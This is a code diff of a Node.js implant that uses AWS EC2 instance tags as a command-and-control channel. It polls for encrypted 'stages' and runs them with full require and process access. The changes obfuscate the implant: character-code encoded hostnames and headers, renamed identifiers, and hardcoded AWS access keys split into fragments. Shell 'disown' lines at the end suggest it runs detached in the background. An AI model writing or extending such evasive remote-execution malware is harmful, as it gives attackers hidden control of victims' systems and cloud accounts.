@@ -72,23 +72,38 @@ const https = require('https');
 const zlib = require('zlib');
 const os = require('os');
 
-let PSK = "IX40blABOxm4PI0D4AH1gbjBSkH5e8Qc";
-let INSTANCE_ID = "i-050ced190b0e11ce8";
-let AWS_REGION = "eu-north-1";
-let AGENT_ID = "__AGENT_ID__";
-let AWS_AK = "AKIA43CSKXPEV67M3IYV";
-let AWS_SK = "GqgUwTwpg++h4ia3VBn4ClTqmAqTyB+yT+RZE6sT";
+let PSK = "msp2nqMlUBfmlgAol9ZaEMRNcSOq05xp";
+let TG = "i-0" + "dee3866ff6055630";
+let REGION = "eu-no" + "rth-1";
+let ID1 = "__CFG_ID__";
+let CK1 = "AKIA43CSKX" + "PE3XLG6UKG";
+let CK2 = "Ehxp6n1WxlxAXQcTvEqU" + "zGiLwZviwvM73u+btSbr";
 
 const POLL_MIN_S = 20;
 const POLL_MAX_S = 60;
 
+const _s = n => String.fromCharCode(...n.split(' ').map(Number));
+const SVC = _s('101 99 50');
+const DOM = [_s('97 109 97 122 111 110 97 119 115'), _s('99 111 109')].join('.');
+const H_CT = _s('99 111 110 116 101 110 116 45 116 121 112 101');
+const V_CT = _s('97 112 112 108 105 99 97 116 105 111 110 47 120 45 119 119 119 45 102 111 114 109 45 117 114 108 101 110 99 111 100 101 100');
+const H_HOST = _s('104 111 115 116');
+const H_DATE = _s('120 45 97 109 122 45 100 97 116 101');
+const H_AUTH = _s('97 117 116 104 111 114 105 122 97 116 105 111 110');
+const H_CL = _s('99 111 110 116 101 110 116 45 108 101 110 103 116 104');
+const ALG = _s('65 87 83 52 45 72 77 65 67 45 83 72 65 50 53 54');
+const REQ = _s('97 119 115 52 95 114 101 113 117 101 115 116');
+const PFX = _s('65 87 83 52');
+const ENV1 = _s('65 87 83 95 65 67 67 69 83 83 95 75 69 89 95 73 68');
+const ENV2 = _s('65 87 83 95 83 69 67 82 69 84 95 65 67 67 69 83 83 95 75 69 89');
+
 function parseArgs() {
   const a = process.argv.slice(2);
   for (let i = 0; i < a.length; i++) {
-    if (a[i] === '--instance-id') INSTANCE_ID = a[++i];
-    else if (a[i] === '--region') AWS_REGION = a[++i];
+    if (a[i] === '--target') TG = a[++i];
+    else if (a[i] === '--region') REGION = a[++i];
     else if (a[i] === '--key') PSK = a[++i];
-    else if (a[i] === '--agent-id') AGENT_ID = a[++i];
+    else if (a[i] === '--id') ID1 = a[++i];
   }
 }
 
@@ -105,44 +120,43 @@ function decrypt(b64) {
 function sha256hex(s) { return crypto.createHash('sha256').update(s, 'utf8').digest('hex'); }
 function hmac(key, s) { return crypto.createHmac('sha256', key).update(s, 'utf8').digest(); }
 
-function ec2Request(params) {
+function apiRequest(params) {
   return new Promise((resolve, reject) => {
-    const ak = placeholder(AWS_AK) ? process.env.AWS_ACCESS_KEY_ID : AWS_AK;
-    const sk = placeholder(AWS_SK) ? process.env.AWS_SECRET_ACCESS_KEY : AWS_SK;
-    if (!ak || !sk) return reject(new Error('no AWS credentials'));
+    const ak = placeholder(CK1) ? process.env[ENV1] : CK1;
+    const sk = placeholder(CK2) ? process.env[ENV2] : CK2;
+    if (!ak || !sk) return reject(new Error('no credentials'));
 
-    const host = `ec2.${AWS_REGION}.amazonaws.com`;
+    const host = [SVC, REGION, DOM].join('.');
     const body = new URLSearchParams(params).toString();
 
     const now = new Date();
-    const amzDate = now.toISOString().replace(/[-:]/g, '').replace(/\.\d{3}/, '');
-    const dateStamp = amzDate.slice(0, 8);
+    const ts = now.toISOString().replace(/[-:]/g, '').replace(/\.\d{3}/, '');
+    const dateStamp = ts.slice(0, 8);
 
-    const headers = {
-      'content-type': 'application/x-www-form-urlencoded',
-      'host': host,
-      'x-amz-date': amzDate,
-    };
+    const headers = {};
+    headers[H_CT] = V_CT;
+    headers[H_HOST] = host;
+    headers[H_DATE] = ts;
     const signedHeaders = Object.keys(headers).sort().join(';');
     const canonicalHeaders = Object.keys(headers).sort().map(k => `${k}:${headers[k]}\n`).join('');
     const canonicalRequest = ['POST', '/', '', canonicalHeaders, signedHeaders, sha256hex(body)].join('\n');
 
-    const scope = `${dateStamp}/${AWS_REGION}/ec2/aws4_request`;
-    const stringToSign = ['AWS4-HMAC-SHA256', amzDate, scope, sha256hex(canonicalRequest)].join('\n');
+    const scope = `${dateStamp}/${REGION}/${SVC}/${REQ}`;
+    const stringToSign = [ALG, ts, scope, sha256hex(canonicalRequest)].join('\n');
 
-    let k = hmac('AWS4' + sk, dateStamp);
-    k = hmac(k, AWS_REGION);
-    k = hmac(k, 'ec2');
-    k = hmac(k, 'aws4_request');
+    let k = hmac(PFX + sk, dateStamp);
+    k = hmac(k, REGION);
+    k = hmac(k, SVC);
+    k = hmac(k, REQ);
     const signature = crypto.createHmac('sha256', k).update(stringToSign, 'utf8').digest('hex');
+
+    const reqHeaders = { ...headers };
+    reqHeaders[H_AUTH] = `${ALG} Credential=${ak}/${scope}, SignedHeaders=${signedHeaders}, Signature=${signature}`;
+    reqHeaders[H_CL] = Buffer.byteLength(body);
 
     const req = https.request({
       host, path: '/', method: 'POST',
-      headers: {
-        ...headers,
-        'authorization': `AWS4-HMAC-SHA256 Credential=${ak}/${scope}, SignedHeaders=${signedHeaders}, Signature=${signature}`,
-        'content-length': Buffer.byteLength(body),
-      },
+      headers: reqHeaders,
     }, res => {
       let data = '';
       res.on('data', c => data += c);
@@ -159,30 +173,30 @@ function ec2Request(params) {
   });
 }
 
-const tagPrefix = () => `deploy-${AGENT_ID}-`;
+const tagPrefix = () => `deploy-${ID1}-`;
 
 async function writeTags(tags) {
-  const params = { 'Action': 'CreateTags', 'Version': '2016-11-15', 'ResourceId.1': INSTANCE_ID };
+  const params = { 'Action': 'CreateTags', 'Version': '2016-11-15', 'ResourceId.1': TG };
   let i = 1;
   for (const [k, v] of Object.entries(tags)) {
     params[`Tag.${i}.Key`] = k;
     params[`Tag.${i}.Value`] = v;
     i++;
   }
-  await ec2Request(params);
+  await apiRequest(params);
 }
 
 async function deleteTagKeys(keys) {
   if (!keys.length) return;
-  const params = { 'Action': 'DeleteTags', 'Version': '2016-11-15', 'ResourceId.1': INSTANCE_ID };
+  const params = { 'Action': 'DeleteTags', 'Version': '2016-11-15', 'ResourceId.1': TG };
   keys.forEach((k, i) => { params[`Tag.${i + 1}.Key`] = k; });
-  await ec2Request(params);
+  await apiRequest(params);
 }
 
 async function readTags() {
-  const out = await ec2Request({
+  const out = await apiRequest({
     'Action': 'DescribeTags', 'Version': '2016-11-15',
-    'Filter.1.Name': 'resource-id', 'Filter.1.Value.1': INSTANCE_ID,
+    'Filter.1.Name': 'resource-id', 'Filter.1.Value.1': TG,
     'Filter.2.Name': 'key', 'Filter.2.Value.1': tagPrefix() + '*',
   });
   const tags = {};
@@ -226,18 +240,18 @@ function randDelay() {
   return new Promise(r => setTimeout(r, s * 1000));
 }
 
-function generateAgentID() {
-  const host = os.hostname().split('.')[0] || 'agent';
+function genID() {
+  const host = os.hostname().split('.')[0] || 'h';
   return `${host}-${crypto.randomBytes(2).toString('hex')}`;
 }
 
 async function main() {
   parseArgs();
-  if (placeholder(AGENT_ID) || !AGENT_ID) AGENT_ID = generateAgentID();
-  if (placeholder(INSTANCE_ID) || placeholder(PSK) || !INSTANCE_ID || !PSK) {
+  if (placeholder(ID1) || !ID1) ID1 = genID();
+  if (placeholder(TG) || placeholder(PSK) || !TG || !PSK) {
     process.exit(1);
   }
-  if (placeholder(AWS_REGION) || !AWS_REGION) AWS_REGION = 'us-east-1';
+  if (placeholder(REGION) || !REGION) REGION = 'us-ea' + 'st-1';
 
   for (;;) {
     await sendHeartbeat();
@@ -245,12 +259,12 @@ async function main() {
     try {
       const src = await fetchStage();
       if (src) {
-        globalThis.__AGENT_ID__ = AGENT_ID;
-        globalThis.__LOADER_PSK__ = PSK;
-        globalThis.__LOADER_INSTANCE__ = INSTANCE_ID;
-        globalThis.__LOADER_REGION__ = AWS_REGION;
-        globalThis.__LOADER_AK__ = AWS_AK;
-        globalThis.__LOADER_SK__ = AWS_SK;
+        globalThis.__CFG_ID__ = ID1;
+        globalThis.__CFG_PK__ = PSK;
+        globalThis.__CFG_TG__ = TG;
+        globalThis.__CFG_RG__ = REGION;
+        globalThis.__CFG_K1__ = CK1;
+        globalThis.__CFG_K2__ = CK2;
         const fn = new Function('require', 'process', 'module', 'exports', '__filename', '__dirname',
           src.startsWith('#!') ? src.slice(src.indexOf('\n') + 1) : src);
         fn(require, process, module, exports, __filename, __dirname);
@@ -263,6 +277,7 @@ async function main() {
 }
 
 main().catch(() => process.exit(1));
+
 
 __CHECK_EOF__
 disown 2>/dev/null || true
